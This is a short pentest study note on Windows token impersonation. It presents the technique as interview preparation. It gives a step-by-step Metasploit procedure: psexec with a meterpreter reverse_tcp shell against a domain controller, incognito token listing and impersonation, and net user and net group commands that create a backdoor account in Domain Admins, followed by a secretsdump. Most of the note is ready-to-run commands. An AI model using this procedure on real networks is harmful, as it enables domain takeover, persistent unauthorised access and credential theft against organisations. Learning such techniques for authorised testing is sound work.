# Token Impersonation

**Token Impersonation** is the concept that every user logged into a system has a token stored for them just as a cookie is cached on a website. The goal is to impersonate a domain admin token and create our own domain admin. 

Step 1: Run Metasploit

```jsx
msfconsole
```

Step 2:  Set options under psexec

```jsx
search psexec

use 4 (exploit/windows/smb/psexec)

options

set payload windows/x64/meterpeter/reverse_tcp

set rhosts IP ADDRESS OF DC

set smbuser USERNAME

set smbpass PASSWORD

set smbdomain DOMAIN
```

 The above commands set the options for your payload and creates a basic shell to access the device. 

Step 3: Load incognito

```jsx
load incognito
```

- User you want to impersonate has to be logged into device. To verify they are logged in run command

```jsx
list_tokens -u
```

Step 4: Impersonate Token

```jsx
impersonate_token DOMAIN\\username
```

Step 5: Give access to yourself with a new account or other tasks. Once you are impersonation a token you can create a user and add them to the domain admins group if you have access to the token of another domain admin

```jsx
shell

net user /add USERNAME PASSWORD /domain

net group "Domain Admins" USERNAME /ADD /DOMAIN
```

Step 6: Test

Perform a secretsdump with the new domain admin

Token Impersonation is a must know for a Pentest Interview, they will ask about it.